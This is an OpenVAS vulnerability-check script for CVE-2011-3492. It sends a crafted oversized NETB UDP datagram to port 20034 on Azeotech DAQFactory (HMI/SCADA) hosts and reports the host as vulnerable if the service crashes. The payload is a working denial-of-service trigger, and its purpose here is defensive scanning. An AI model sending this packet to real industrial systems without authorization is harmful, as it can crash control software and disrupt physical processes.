###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_daqfactory_netb_datagram_stack_bof.nasl 13 2013-10-27 12:16:33Z jan $
#
# Azeotech DAQFactory NETB Datagram Parsing Stack Buffer Overflow Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  on the system or cause denial of service condition.
  Impact Level: System/Application";
tag_affected = "Azeotech DAQFactory 5.85 build 1853 and earlier.";
tag_insight = "The flaw is due to an error while parsing NETB datagrams. Which can
  be exploited to cause a buffer overflow by sending a crafted NETB packet
  to port 20034/UDP.";
tag_solution = "No solution or patch is available as of 04th October 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.azeotech.com/daqfactory.php";
tag_summary = "This host is installed with Azeotech DAQFactory (HMI/SCADA) and
  is prone to denial of service vulnerability.";

if(description)
{
  script_id(802037);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-10-07 15:45:35 +0200 (Fri, 07 Oct 2011)");
  script_cve_id("CVE-2011-3492");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("Azeotech DAQFactory NETB Datagram Parsing Stack Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/75496");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/69764");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17841");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/daqfactory_1-adv.txt");
  script_xref(name : "URL" , value : "http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-02.pdf");

  script_description(desc);
  script_summary("Check Azeotech DAQFactory is vulnerable to BoF");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_udp_ports(20034);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("network_func.inc");

## Azeotech DAQFactory UDP port
port = 20034;

## Check udp port status
if(!get_udp_port_state(port)){
  exit(0);
}

## Check UDP port status as get_udp_port_state() not working properly
if(!check_udp_port_status(dport:port)){
  exit(0);
}

##  Open udp socket
soc1 = open_sock_udp(port);
if(!soc1){
  exit(0);
}

req = raw_string( 'NETB',
                  crap(data:raw_string(0xff), length:156),
                  crap(data:'A', length:78),
                  0x00,
                  crap(data:'A', length:785)
                );

## send the data
send(socket:soc1, data:req);

sleep(1);

## Check UDP port closed or not
## i.e Confirm exploit worked or not
if(!check_udp_port_status(dport:port)){
  security_hole(port:port, proto:'udp');
}
